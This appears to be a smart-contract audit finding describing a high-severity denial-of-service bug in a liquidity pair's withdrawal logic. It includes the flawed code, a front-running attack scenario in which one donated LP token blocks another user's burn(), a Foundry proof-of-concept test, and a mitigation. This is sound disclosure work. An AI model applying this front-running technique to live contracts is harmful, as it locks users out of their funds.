# Ignite Labs
Ignite Labs Audit || Dec 2025

My Finding Summary
|ID|Title|Severity|
|:-:|:---|:------:|
|[H-01](#h-01-an-attacker-can-dos-liquidity-withdrawal-for-another-user-via-lptokenholder-with-just-1-lp-token)|An attacker can DOS liquidity withdrawal for another user via LpTokenHolder with just 1 Lp token|HIGH|

----


## [H-01] An attacker can DOS liquidity withdrawal for another user via LpTokenHolder with just 1 Lp token
### Description

An attacker can prevent legitimate users from withdrawing their liquidity by front-running their burn() transaction and donating a dust amount of LP tokens to the pair contract. This causes the victim's withdrawal to revert, temporarily locking their funds.

## Root Cause

The `_removeLiquidity()` function determines the LP token holder by checking only the first bin's balance at `address(this)`:

```solidity
address lpTokenHolder = balanceOf(address(this), ids.length > 0 ? ids[0].safe24() : 0) > 0
    ? address(this)
    : msg.sender;
```

This single-bin check is then applied to ALL bins in the withdrawal request. If an attacker donates even 1 LP token for the first bin to the pair contract, the function incorrectly assumes all LP tokens should be burned from the pair, not from the user's wallet.

## Attack Scenario

Alice (victim) holds LP tokens in bins [8388608, 8388609] in her wallet
Bob (attacker) holds a small amount of LP tokens in bin 8388608

**Step-by-Step Attack:**

1. Alice submits a transaction to withdraw liquidity: `burn([8388608, 8388609], [50e18, 50e18], alice)`
2. Bob sees Alice's pending transaction in the mempool
3. Bob front-runs with: `safeTransferFrom(bob, pair, 8388608, 1)` - donating just 1 LP token to the pair contract
4. Alice's transaction executes:
   - `lpTokenHolder = balanceOf(pair, 8388608) > 0` evaluates to `1 > 0 = TRUE`
   - Therefore `lpTokenHolder = address(pair)` instead of `alice`
   - The loop checks: `balanceOf(pair, 8388608) >= 50e18` → `1 >= 50e18` → `FALSE`
   - Transaction reverts with `LBPair__InsufficientLiquidity`
5. Alice's withdrawal fails; her funds remain locked

**Result:**
- Alice cannot withdraw her liquidity
- Cost to attacker: Gas + 1 LP token (dust amount)

## Impact

Legitimate users cannot withdraw their liquidity. An attacker can repeatedly DOS withdrawals at minimal cost.

## POC

```solidity
function test_POC_DoS_lpTokenHolderManipulation() public {
    // SETUP: Alice adds liquidity to multiple bins
    uint256 amount = 100_000e18;
    
    token0.mint(alice, amount * 4);
    token1.mint(alice, amount * 4);
    token0.mint(bob, amount * 2);
    token1.mint(bob, amount * 2);
    
    // Alice adds liquidity to TWO bins
    vm.startPrank(alice);
    token0.transfer(address(pair), amount);
    token1.transfer(address(pair), amount);
    
    uint256[] memory ids = new uint256[](2);
    uint256[] memory amounts = new uint256[](2);
    ids[0] = ACTIVE_BIN_ID;
    ids[1] = ACTIVE_BIN_ID + 1;
    amounts[0] = amount * 2;
    amounts[1] = amount;
    
    if (address(pairTokenY) == address(token0)) {
        token0.transfer(address(pair), amount);
    } else {
        token1.transfer(address(pair), amount);
    }
    
    pair.mint(ids, amounts, alice);
    vm.stopPrank();
    
    // Bob gets minimal LP tokens
    vm.startPrank(bob);
    token0.transfer(address(pair), 100);
    token1.transfer(address(pair), 100);
    
    uint256[] memory bobIds = new uint256[](1);
    uint256[] memory bobAmounts = new uint256[](1);
    bobIds[0] = ACTIVE_BIN_ID;
    bobAmounts[0] = 200;
    
    pair.mint(bobIds, bobAmounts, bob);
    vm.stopPrank();
    
    // ATTACK: Bob donates 1 LP token to pair contract
    vm.startPrank(bob);
    pair.safeTransferFrom(bob, address(pair), ACTIVE_BIN_ID, 1);
    vm.stopPrank();
    
    // VICTIM: Alice tries to withdraw
    uint256[] memory burnIds = new uint256[](2);
    uint256[] memory burnAmounts = new uint256[](2);
    burnIds[0] = ACTIVE_BIN_ID;
    burnIds[1] = ACTIVE_BIN_ID + 1;
    burnAmounts[0] = 50e18;
    burnAmounts[1] = 50e18;
    
    vm.startPrank(alice);
    
    // ATTACK SUCCESS: Transaction reverts
    vm.expectRevert(IUmbraeLBPair.LBPair__InsufficientLiquidity.selector);
    pair.burn(burnIds, burnAmounts, alice);
    
    vm.stopPrank();
}
```

## Mitigation

Check the LP token holder for each bin individually instead of relying on only the first bin's balance to determine the holder for all bins.
